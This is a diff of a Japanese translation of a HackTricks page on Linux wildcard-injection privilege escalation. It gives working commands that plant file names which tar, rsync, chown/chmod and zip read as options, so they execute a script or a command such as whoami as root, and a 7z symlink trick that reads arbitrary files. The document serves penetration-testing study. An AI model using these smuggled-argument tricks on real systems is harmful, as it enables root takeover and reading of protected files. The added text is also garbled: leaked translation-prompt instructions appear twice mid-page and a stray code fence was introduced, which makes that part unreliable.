@@ -1,42 +1,44 @@
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>
 
-- **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+HackTricksをサポートする他の方法:
 
-- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
-
-- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
-
-- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
-
-- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください**。
+* **HackTricksにあなたの会社を広告したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
+* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
+* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有する。
 
 </details>
 
 
-## chown、chmod
+## chown, chmod
 
-**他のファイルにコピーするファイルの所有者とアクセス許可を指定**することができます。
+**残りのファイルに対して、どのファイルオーナーと権限をコピーしたいかを指定できます**
 ```bash
 touch "--reference=/my/own/path/filename"
 ```
-これを利用することができます [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(組み合わせ攻撃)_\
-__詳細はこちら [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
+以下のテキストは、ハッキング技術に関する本の内容です。関連する英語のテキストを日本語に翻訳し、まったく同じマークダウンおよびHTML構文を保持して翻訳を返してください。コード、ハッキング技術名、ハッキング用語、クラウド/SaaSプラットフォーム名（Workspace、aws、gcpなど）、'leak'という単語、ペネトレーションテスト、およびマークダウンタグなどは翻訳しないでください。また、翻訳とマークダウン構文以外の余分なものは追加しないでください。
+
+これを利用するには、[https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(組み合わせ攻撃)_ を使用します。\
+__詳細は [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930) にあります。
 
 ## Tar
 
-**任意のコマンドを実行する:**
+**任意のコマンドを実行:**
 ```bash
 touch "--checkpoint=1"
 touch "--checkpoint-action=exec=sh shell.sh"
 ```
-これを利用することができます [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar攻撃)_\
-__詳細は[https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)を参照してください
+以下は、ハッキング技術に関するハッキングの本の内容です。ファイル linux-hardening/privilege-escalation/wildcards-spare-tricks.md の関連する英語テキストを日本語に翻訳し、まったく同じマークダウンおよびhtml構文を保持して翻訳を返してください。コード、ハッキング技術名、ハッキング用語、クラウド/SaaSプラットフォーム名（Workspace、aws、gcpなど）、'leak'という単語、ペネトレーションテスト、およびマークダウンタグのようなものは翻訳しないでください。また、翻訳とマークダウン構文以外の余分なものは追加しないでください。
+
+これを利用するには、[https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar attack)_ を使用します。\
+__詳細は [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930) にあります。
 
 ## Rsync
 
-**任意のコマンドを実行する:**
+**任意のコマンドを実行:**
 ```bash
 Interesting rsync option from manual:
 
@@ -47,46 +49,43 @@ Interesting rsync option from manual:
 ```bash
 touch "-e sh shell.sh"
 ```
-この脆弱性は、[https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) (_rsync攻撃_) を使用して悪用することができます。\
-__詳細は[https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)を参照してください。
+この攻撃は [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) (_rsync_ 攻撃) を使用して利用できます。\
+__詳細は [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930) にあります。
 
 ## 7z
 
-**7z**では、`*`の前に`--`を使用しても（`--`は、次の入力がパラメータとして処理されないことを意味し、この場合はファイルパスのみです）、任意のエラーを引き起こしてファイルを読み取ることができます。したがって、次のようなコマンドがrootによって実行されている場合、悪用することができます。
+**7z** では、`--` の後に `*` を使用しても（`--` はその後の入力がパラメータとして扱われないことを意味するので、この場合はファイルパスのみです）、任意のエラーを発生させてファイルを読み取ることができます。したがって、以下のようなコマンドが root によって実行されている場合：
 ```bash
 7za a /backup/$filename.zip -t7z -snl -p$pass -- *
 ```
-そして、この実行中のフォルダにファイルを作成することができます。`@root.txt`というファイルと、ファイル`root.txt`を作成できます。`root.txt`は、読み取りたいファイルへの**シンボリックリンク**です。
+フォルダ内でファイルを作成できる場合、`@root.txt` ファイルと、読みたいファイルへの**シンボリックリンク**である `root.txt` ファイルを作成できます：
 ```bash
 cd /path/to/7z/acting/folder
 touch @root.txt
 ln -s /file/you/want/to/read root.txt
 ```
-その後、**7z**が実行されると、`root.txt`を圧縮すべきファイルのリストを含むファイルとして扱います（これが`@root.txt`の存在を示しています）。そして、7zが`root.txt`を読み込むと、`/file/you/want/to/read`を読み込みますが、**このファイルの内容がファイルのリストではないため、エラーが発生します**。
+その後、**7z**が実行されると、`root.txt`を圧縮すべきファイルのリストを含むファイルとして扱います（これは`@root.txt`の存在が示しています）。そして、7zが`root.txt`を読むとき、`/file/you/want/to/read`を読みますが、**このファイルの内容がファイルのリストではないため、エラーを投げて内容を表示します。**
 
-_詳細は、HackTheBoxのCTFのWrite-upsを参照してください。_
+_詳細はHackTheBoxのCTFボックスのWrite-upsを参照してください。_
 
 ## Zip
 
-**任意のコマンドを実行する：**
+**任意のコマンドを実行:**
 ```bash
 zip name.zip files -T --unzip-command "sh -c whoami"
 ```
-__
-
-
+```
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェックしてください！</strong></summary>
 
-- **サイバーセキュリティ会社で働いていますか？** **HackTricksで会社を宣伝したいですか？** または、**最新バージョンのPEASSにアクセスしたいですか？** または、**HackTricksをPDFでダウンロードしたいですか？** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+HackTricksをサポートする他の方法:
 
-- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
-
-- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
-
-- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-
-- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。
+* **HackTricksにあなたの会社を広告したい場合**、または**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手してください。
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見してください。私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションです。
+* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加するか**、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローしてください。**
+* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)や[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングテクニックを共有してください。
 
 </details>
+```
